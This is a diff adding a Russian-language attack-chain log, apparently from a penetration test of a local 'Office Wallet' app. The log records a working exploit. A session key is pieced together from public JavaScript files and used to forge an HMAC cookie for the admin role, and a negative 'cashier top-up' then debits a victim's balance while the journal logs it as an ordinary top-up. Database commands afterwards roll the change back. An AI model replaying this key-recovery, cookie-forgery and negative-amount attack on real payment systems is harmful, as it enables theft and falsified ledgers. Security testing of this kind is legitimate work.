@@ -1,0 +1,34 @@
+OFFICE WALLET · ЦЕПОЧКА АТАКИ
+################################################################################################
+# Ц-3b
+################################################################################################
+== Ц-3b · Роль кассира из куки → деньги уходят «пополнением» ==
+    · Та же кука проходит и в IsCashier. cashierTopup не проверяет знак суммы —
+    · отрицательное «пополнение» списывает деньги у жертвы, а в журнале это
+    · обычная строка topup (OW-19).
+    → GET /static/wallet.js (кусок ключа)
+    ← HTTP 200 /* Office Wallet client */ window.OfficeWallet = {   keyParts: ["office", "-", "wallet"],   tipLimitRub: 50,   sessionKey() {     const tail = window.__SK_TAIL__ || "";     return this.keyParts.join("") + tail;   },   formatRub(kop) {     c...
+    → GET /static/legacy-sync.js (хвост ключа)
+    ← HTTP 200 /* Legacy supply sync helpers */ (function () {   window.SupplySync = {     pathParts: ["api", "v2", "supply", "pricing"],     endpoint() {       return "/" + this.pathParts.join("/");     },     async resolveChannel() {       const r = awa...
+    → SQL SELECT id FROM users WHERE login='adminw'
+    ← psql 6
+    HMAC-SHA256(office-wallet-session-key, '6:admin') = c59d80997f788119de7c0e28…
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 957300
+    → POST /cashier/topup  amount_rub=-100
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT balance_kop FROM users WHERE login='petrova';
+    ← psql 947300
+    → SQL SELECT id||'|'||amount_kop||'|'||memo FROM operations ORDER BY id DESC LIMIT 1
+    ← psql 692|-10000|Кассовое пополнение
+    ┌─ АРТЕФАКТ · Ц-3b · отрицательное «пополнение» проведено
+    │ POST /cashier/topup amount_rub=-100 → HTTP 302
+    │ petrova balance_kop: 957300 → 947300 (-10000 коп)
+    │ последняя операция: 692|-10000|Кассовое пополнение
+    └─
+    → SQL UPDATE users SET balance_kop=957300 WHERE login='petrova'
+    ← psql UPDATE 1
+    → SQL DELETE FROM operations WHERE id=692
+    ← psql DELETE 1
+    откат: баланс 957300 восстановлен, операция topup удалена
+[+] минус проведён как «пополнение»: −100 ₽ списаны
